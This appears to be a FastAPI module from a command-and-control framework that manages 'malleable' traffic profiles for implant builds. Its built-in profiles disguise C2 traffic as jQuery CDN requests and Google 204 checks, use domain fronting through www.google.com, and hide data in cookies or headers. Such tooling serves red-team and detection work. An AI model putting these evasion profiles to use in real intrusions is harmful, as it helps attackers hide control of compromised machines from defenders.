"""
C2 Profiles API — manage malleable C2 profiles for agent builds.

Endpoints:
  GET    /              — list all profiles
  POST   /              — create a new profile (operator+)
  GET    /defaults      — list built-in default profiles
  GET    /{profile_id}  — get a specific profile
  PUT    /{profile_id}  — update a profile (operator+)
  DELETE /{profile_id}  — delete a profile (operator+)
  POST   /{profile_id}/activate — set as active profile for agent builds
"""
import json
from datetime import datetime, timezone

from fastapi import APIRouter, HTTPException
from pydantic import BaseModel, Field

from database import database
from db.models import C2Profile
from dependencies import CurrentUser, OperatorUser

router = APIRouter(prefix="/c2-profiles", tags=["c2-profiles"])


# ---------------------------------------------------------------------------
# Pydantic schemas
# ---------------------------------------------------------------------------


class C2ProfileCreate(BaseModel):
    name: str = Field(..., min_length=1, max_length=128)
    http_get_uri: str = "/api/v1/agents/{agent_id}/tasks"
    http_post_uri: str = "/api/v1/tasks/{task_id}/result"
    http_get_verb: str = "GET"
    http_post_verb: str = "POST"
    user_agent: str = ""
    custom_headers: dict = {}
    cookie_name: str = ""
    stage_uri: str = "/api/v1/stage"
    jitter_seconds: float = 2.0
    max_retries: int = 5
    ssl_cert_hash: str = ""
    redirector_url: str = ""
    domain_front_host: str = ""
    body_encoding: str = "json"
    data_param: str = "d"
    task_param: str = "t"


class C2ProfileUpdate(BaseModel):
    name: str | None = None
    http_get_uri: str | None = None
    http_post_uri: str | None = None
    http_get_verb: str | None = None
    http_post_verb: str | None = None
    user_agent: str | None = None
    custom_headers: dict | None = None
    cookie_name: str | None = None
    stage_uri: str | None = None
    jitter_seconds: float | None = None
    max_retries: int | None = None
    ssl_cert_hash: str | None = None
    redirector_url: str | None = None
    domain_front_host: str | None = None
    body_encoding: str | None = None
    data_param: str | None = None
    task_param: str | None = None


# ---------------------------------------------------------------------------
# Built-in default profiles (mirrors agent/core/malleable.py)
# ---------------------------------------------------------------------------

_BUILTIN_DEFAULTS = [
    {
        "name": "http_default",
        "http_get_uri": "/api/v1/agents/{agent_id}/tasks",
        "http_post_uri": "/api/v1/tasks/{task_id}/result",
        "http_get_verb": "GET",
        "http_post_verb": "POST",
        "user_agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "custom_headers": {},
        "cookie_name": "",
        "stage_uri": "/api/v1/stage",
        "jitter_seconds": 2.0,
        "max_retries": 5,
        "ssl_cert_hash": "",
        "redirector_url": "",
        "domain_front_host": "",
        "body_encoding": "json",
        "data_param": "d",
        "task_param": "t",
    },
    {
        "name": "https_cdn",
        "http_get_uri": "/cdn/assets/jquery.min.js",
        "http_post_uri": "/cdn/upload",
        "http_get_verb": "GET",
        "http_post_verb": "POST",
        "user_agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "custom_headers": {
            "Accept": "application/javascript, text/javascript, */*",
            "X-Cache-Status": "MISS",
            "X-Forwarded-For": "203.0.113.42",
        },
        "cookie_name": "__cf_bm",
        "stage_uri": "/cdn/static/bundle.js",
        "jitter_seconds": 5.0,
        "max_retries": 8,
        "ssl_cert_hash": "",
        "redirector_url": "",
        "domain_front_host": "",
        "body_encoding": "base64-in-cookie",
        "data_param": "v",
        "task_param": "i",
    },
    {
        "name": "google_front",
        "http_get_uri": "/generate_204",
        "http_post_uri": "/gen_204",
        "http_get_verb": "GET",
        "http_post_verb": "POST",
        "user_agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) "
            "Gecko/20100101 Firefox/125.0"
        ),
        "custom_headers": {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
        },
        "cookie_name": "NID",
        "stage_uri": "/client_204",
        "jitter_seconds": 3.0,
        "max_retries": 10,
        "ssl_cert_hash": "",
        "redirector_url": "",
        "domain_front_host": "www.google.com",
        "body_encoding": "base64-in-header",
        "data_param": "q",
        "task_param": "s",
    },
]


# ---------------------------------------------------------------------------
# Routes — note: /defaults must be declared before /{profile_id}
# ---------------------------------------------------------------------------


@router.get("/defaults")
async def list_default_profiles(current_user: CurrentUser) -> list[dict]:
    """List all built-in default profiles."""
    return _BUILTIN_DEFAULTS


@router.get("")
async def list_profiles(current_user: CurrentUser) -> list[dict]:
    """List all stored C2 profiles."""
    with database:
        return [p.to_dict() for p in C2Profile.select().order_by(C2Profile.created_at)]


@router.post("", status_code=201)
async def create_profile(body: C2ProfileCreate, current_user: OperatorUser) -> dict:
    """Create a new malleable C2 profile."""
    with database:
        existing = C2Profile.get_or_none(C2Profile.name == body.name)
        if existing:
            raise HTTPException(409, f"Profile '{body.name}' already exists")
        profile = C2Profile.create(
            name=body.name,
            http_get_uri=body.http_get_uri,
            http_post_uri=body.http_post_uri,
            http_get_verb=body.http_get_verb,
            http_post_verb=body.http_post_verb,
            user_agent=body.user_agent,
            custom_headers=json.dumps(body.custom_headers),
            cookie_name=body.cookie_name,
            stage_uri=body.stage_uri,
            jitter_seconds=str(body.jitter_seconds),
            max_retries=body.max_retries,
            ssl_cert_hash=body.ssl_cert_hash,
            redirector_url=body.redirector_url,
            domain_front_host=body.domain_front_host,
            body_encoding=body.body_encoding,
            data_param=body.data_param,
            task_param=body.task_param,
        )
    return profile.to_dict()


@router.get("/{profile_id}")
async def get_profile(profile_id: str, current_user: CurrentUser) -> dict:
    """Get a specific C2 profile by ID."""
    with database:
        p = C2Profile.get_or_none(C2Profile.id == profile_id)
        if not p:
            raise HTTPException(404, "Profile not found")
        return p.to_dict()


@router.put("/{profile_id}")
async def update_profile(
    profile_id: str, body: C2ProfileUpdate, current_user: OperatorUser
) -> dict:
    """Update an existing C2 profile."""
    with database:
        p = C2Profile.get_or_none(C2Profile.id == profile_id)
        if not p:
            raise HTTPException(404, "Profile not found")
        if p.is_builtin:
            raise HTTPException(403, "Cannot modify built-in profiles")
        updates = body.model_dump(exclude_none=True)
        if "custom_headers" in updates:
            updates["custom_headers"] = json.dumps(updates["custom_headers"])
        if "jitter_seconds" in updates:
            updates["jitter_seconds"] = str(updates["jitter_seconds"])
        updates["updated_at"] = datetime.now(timezone.utc)
        for k, v in updates.items():
            setattr(p, k, v)
        p.save()
    return p.to_dict()


@router.delete("/{profile_id}", status_code=204)
async def delete_profile(profile_id: str, current_user: OperatorUser) -> None:
    """Delete a C2 profile."""
    with database:
        p = C2Profile.get_or_none(C2Profile.id == profile_id)
        if not p:
            raise HTTPException(404, "Profile not found")
        if p.is_builtin:
            raise HTTPException(403, "Cannot delete built-in profiles")
        p.delete_instance()


@router.post("/{profile_id}/activate")
async def activate_profile(profile_id: str, current_user: OperatorUser) -> dict:
    """Set a profile as the active profile for agent builds."""
    with database:
        p = C2Profile.get_or_none(C2Profile.id == profile_id)
        if not p:
            raise HTTPException(404, "Profile not found")
        # Deactivate all other profiles
        C2Profile.update(is_active=False).execute()
        p.is_active = True
        p.save()
    return {"profile_id": str(p.id), "name": p.name, "is_active": True}
